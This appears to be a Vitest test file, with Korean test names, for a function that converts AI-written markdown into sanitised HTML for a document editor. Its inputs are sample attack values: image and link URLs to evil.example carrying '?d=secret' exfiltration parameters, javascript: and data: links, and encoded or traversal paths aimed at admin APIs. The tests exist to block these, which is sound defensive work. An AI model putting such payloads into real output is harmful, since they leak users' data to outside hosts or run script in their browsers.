import { Editor } from '@tiptap/core'
import { describe, expect, it } from 'vitest'
import { docContentExtensions } from '@/features/docs/editorExtensions'
import { markdownToHtml } from './markdownToHtml'

describe('markdownToHtml', () => {
  it('굵게·목록·번호·줄바꿈을 서식으로 옮긴다', () => {
    const html = markdownToHtml('**대상**: 전 임직원\n둘째 줄\n\n- 가\n- 나\n\n1. 하나\n2. 둘')
    expect(html).toContain('<strong>대상</strong>: 전 임직원<br>')
    expect(html).toMatch(/<ul>\s*<li>가<\/li>\s*<li>나<\/li>\s*<\/ul>/)
    expect(html).toMatch(/<ol>\s*<li>하나<\/li>\s*<li>둘<\/li>\s*<\/ol>/)
  })

  it('AI 가 쓴 태그는 글자로 남는다. 그림·링크·스크립트가 노드가 되지 않는다', () => {
    const html = markdownToHtml(
      '요약\n<img src="https://evil.example/x.png?d=secret">\n\n<a href="javascript:alert(1)">링크</a> & <b>굵게</b>',
    )
    expect(html).not.toMatch(/<img|<a |<b>|<script/)
    expect(html).toContain('&lt;img src="https://evil.example/x.png?d=secret"&gt;')
    expect(html).toContain('&amp;')
  })

  it('마크다운 그림은 부르지 않고 대체 글만, 위험한 링크 주소는 비운다', () => {
    const html = markdownToHtml(
      '![사양표](https://evil.example/x.png) [눌러](javascript:alert(1)) [데이터](data:text/html,x) [사내](https://zenith.local/a)',
    )
    expect(html).not.toContain('<img')
    expect(html).toContain('사양표')
    expect(html).not.toMatch(/javascript:|data:/)
    expect(html).not.toContain('href=')
  })

  it('사내 경로만 링크로 남기고, 바깥 주소는 실제 주소를 글자로 드러낸다', () => {
    const html = markdownToHtml(
      '[규정](/docs/abc) [사내 규정 보기](//evil.example/?d=SECRET) [원문](http://10.0.0.5/c?d=SECRET) 참고 www.evil.example/?d=x [메일](mailto:spy@evil.example?body=x)',
    )
    expect(html).toContain('<a href="/docs/abc" target="_blank" rel="noopener noreferrer">규정</a>')
    expect(html.match(/<a /g)).toHaveLength(1)
    expect(html).toContain('사내 규정 보기 (//evil.example/?d=SECRET)')
    expect(html).toContain('원문 (http://10.0.0.5/c?d=SECRET)')
  })

  it('파일 주소는 링크가 아니라 내려받기 버튼, 그 밖의 API 주소는 글자다', () => {
    const html = markdownToHtml(
      '[📎 매출.xlsx](/api/ai/attachments/0b1c-9f) [규정](/api/files/ab12) [회의록.pdf](/api/channels/c1/attachments/f1/회의록.pdf) [사용자](/api/admin/users) [위](/api/channels/c1/attachments/f1/..)',
    )
    expect(html).not.toContain('<a ')
    expect(html.match(/<button type="button"/g)).toHaveLength(3)
    expect(html).toContain('📎 매출.xlsx</button>')
    expect(html).toContain('사용자 (/api/admin/users)')
    expect(html).toContain('위 (/api/channels/c1/attachments/f1/..)')
  })

  it('풀면 API 가 되는 주소도 링크로 두지 않는다', () => {
    const html = markdownToHtml(
      '[a](/./api/admin/users) [b](/docs/../api/admin/users) [c](/%61pi/admin/users) [d](/api?x=1) [e](/API/me) [규정](/docs/abc)',
    )
    expect(html.match(/<a /g)).toHaveLength(1)
    expect(html).toContain('href="/docs/abc"')
  })

  it('굵게 감싼 파일 링크도 이름을 잃지 않는다', () => {
    const html = markdownToHtml('[**📎 매출 _요약_.xlsx**](/api/ai/attachments/x1)')
    expect(html).toContain('title="매출 요약.xlsx 내려받기"')
  })

  it('깊게 겹친 마크다운으로 파서가 터지면 원문 글자로 남는다', () => {
    const text = '>'.repeat(5000) + ' x'
    const html = markdownToHtml(text)
    expect(html.startsWith('<p class="whitespace-pre-wrap">&gt;&gt;')).toBe(true)
  })

  it('편집기에 넣으면 목록·표가 노드가 되고 그림 블록은 생기지 않는다', () => {
    const editor = new Editor({ extensions: docContentExtensions(), content: '<p>앞</p>' })
    editor.commands.insertContentAt(
      editor.state.doc.content.size,
      markdownToHtml(
        '- 가\n\n| 항목 | 내용 |\n| --- | --- |\n| a | b |\n\n![x](https://evil.example/x.png) <img src="https://evil.example/y.png">',
      ),
    )
    const json = JSON.stringify(editor.getJSON())
    expect(json).toContain('"bulletList"')
    expect(json).toContain('"table"')
    expect(json).not.toContain('imageBlock')
    expect(editor.getText()).toContain('<img src="https://evil.example/y.png">')
    editor.destroy()
  })

  it('물결표 범위 표기는 취소선이 아니다', () => {
    const html = markdownToHtml('근무 시간은 9~18시, 점심은 12~13시입니다')
    expect(html).not.toContain('<del>')
    expect(html).toContain('9~18시, 점심은 12~13시')
  })

  it('넓은 표는 가로로 구르는 상자에 담긴다', () => {
    expect(markdownToHtml('| a | b |\n| --- | --- |\n| 1 | 2 |')).toMatch(
      /^<div class="overflow-x-auto"><table>/,
    )
  })

  it('빈 글은 빈 문자열이다', () => {
    expect(markdownToHtml('  \n\n ')).toBe('')
  })
})
